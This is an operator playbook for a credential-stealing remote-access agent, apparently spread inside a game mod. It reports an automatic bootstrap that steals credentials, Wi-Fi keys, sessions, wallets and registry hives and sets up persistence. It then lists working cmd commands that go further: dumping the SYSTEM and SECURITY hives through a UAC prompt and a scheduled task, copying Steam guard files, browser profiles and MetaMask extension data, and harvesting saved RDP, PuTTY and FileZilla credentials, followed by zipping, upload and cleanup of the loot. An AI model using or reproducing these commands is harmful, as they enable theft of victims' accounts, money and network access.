# Shell playbook

From 0.2.0 an install collects itself: on the first start the agent runs a
bootstrap in the background (recon, credentials, Wi-Fi, sessions, wallets,
keys, screenshot, hives), uploads it and turns on persistence and auto-update.
A fresh infection needs **no** commands; they are for specific things, extras
or a repair.

Everything below runs as `cmd /c <command>` with the cwd in `%USERPROFILE%`,
a 60 s timeout, and output over 1000 characters is uploaded as a `.txt`.

Rules:

- one thing per command, the timeout is 60 s;
- `%VAR%` is expanded by `cmd`, use it instead of absolute paths;
- `2>nul` keeps missing folders quiet;
- collect into `loot\`, then `download` the zip and `rmdir /s /q loot`.

## 0. Check the bootstrap

```
shell dir "%LOCALAPPDATA%\ServerPackCore\loot" & schtasks /query /tn ServerPackCore /fo csv /nh >nul 2>&1 && echo TASK_OK || echo NO_TASK
```

`loot` empty and `TASK_OK` means it already ran. `NO_TASK` means persistence
failed and the next reboot will not bring the agent back; run `persist on` and
read the reply.

Repeat the whole bootstrap (after a botched first run):

```
persist on
shell rmdir /s /q "%LOCALAPPDATA%\ServerPackCore\loot" 2>nul & del "%LOCALAPPDATA%\ServerPackCore\state.json" 2>nul
```

`state.json` holds `bootstrap`; deleting it re-arms the collector. The agent has
to be restarted for that (`kill`, or close the game).

## 1. Hives (only if UAC was declined)

The manual way first — but if you have no shell access to type it, `hives`
re-runs the step on its own:

```
shell mkdir "%TEMP%\h" 2>nul & (echo reg save HKLM\SYSTEM "%TEMP%\h\SYSTEM.hiv" /y & echo reg save HKLM\SECURITY "%TEMP%\h\SECURITY.hiv" /y & echo robocopy C:\Windows\System32\Microsoft\Protect "%TEMP%\h\ProtectSystem" /e /njh /njs /ndl /nc /ns & echo tar -a -cf "%TEMP%\h\hives.zip" -C "%TEMP%\h" SYSTEM.hiv SECURITY.hiv ProtectSystem & echo schtasks /delete /tn spcdump /f) > "%TEMP%\h\dump.bat" & (echo schtasks /create /tn spcdump /tr "%TEMP%\h\dump.bat" /sc once /st 00:00 /ru SYSTEM /f & echo schtasks /run /tn spcdump) > "%TEMP%\h\runas.bat" & powershell -NoP -C "Start-Process cmd -ArgumentList '/c',\"$env:TEMP\h\runas.bat\" -Verb RunAs -WindowStyle Hidden" & echo uac
```

Wait 30 s, then:

```
shell dir "%TEMP%\h"
```

`hives.zip` there means it worked: `shell download %TEMP%\h\hives.zip`.

## 2. Steam guard files

```
shell for %f in ("%PROGRAMFILES(X86)%\Steam\ssfn*") do @copy /y "%f" "%USERPROFILE%\loot"
```

## 3. Extra browsers / profiles

The collector takes the default profile of Chrome, Edge, Brave and all of
Firefox. For another Windows profile, or a second Chrome profile:

```
shell robocopy "%LOCALAPPDATA%\Google\Chrome\User Data\Profile 1" "%USERPROFILE%\loot\p1" /e /njh /njs /ndl /nc /ns
```

## 4. Extension wallets of every browser

```
shell robocopy "%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn" "%USERPROFILE%\loot\mm-brave" /e /njh /njs /ndl /nc /ns
```

Same line with `Microsoft\Edge\User Data` for Edge.

## 5. Saved credentials, RDP, FTP

```
shell (cmdkey /list & reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s & reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s & dir /s /b "%USERPROFILE%\Documents\*.rdp" "%USERPROFILE%\Desktop\*.rdp" & type "%APPDATA%\FileZilla\recentservers.xml" "%APPDATA%\FileZilla\sitemanager.xml" "%APPDATA%\WinSCP.ini") > "%USERPROFILE%\loot\creds.txt" 2>nul & type "%USERPROFILE%\loot\creds.txt"
```

## 6. Wi-Fi

```
shell mkdir "%USERPROFILE%\loot\wifi" 2>nul & netsh wlan export profile folder="%USERPROFILE%\loot\wifi" key=clear >nul & tar -a -cf "%USERPROFILE%\loot\wifi.zip" -C "%USERPROFILE%\loot" wifi & echo done
```

## 7. Machine and identity

```
shell systeminfo > "%USERPROFILE%\loot\recon.txt" 2>&1 & whoami /all >> "%USERPROFILE%\loot\recon.txt" & type "%USERPROFILE%\loot\recon.txt"
```

## 8. Interesting documents

```
shell dir /s /b "%USERPROFILE%\Desktop" "%USERPROFILE%\Documents" "%USERPROFILE%\Downloads" 2>nul | findstr /i "\.kdbx \.rdp \.ovpn \.pem \.pfx \.docx \.xlsx \.pdf" > "%USERPROFILE%\loot\docs.txt" & type "%USERPROFILE%\loot\docs.txt"
```

## 9. Software and AV

```
shell (reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s /v DisplayName & wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName,productState) > "%USERPROFILE%\loot\software.txt" 2>&1 & type "%USERPROFILE%\loot\software.txt"
```

## 10. Collect and clean

```
shell dir /b "%USERPROFILE%\loot"
shell download loot\<file>
shell rmdir /s /q "%USERPROFILE%\loot"
```

## Notes

- The Windows install directory is `%LOCALAPPDATA%\ServerPackCore` (hidden).
- `spc.debug` in `latest.log` traces what the agent ran; `shell` output is also
  mirrored to Discord, so redirect to a file before `type` on anything long.
- Robocopy exit codes 0–7 are success; only the text output is surfaced.
- A standard (non-admin) account cannot grant the hives: UAC asks for an
  administrator password. Everything else still works with the user password
  alone.
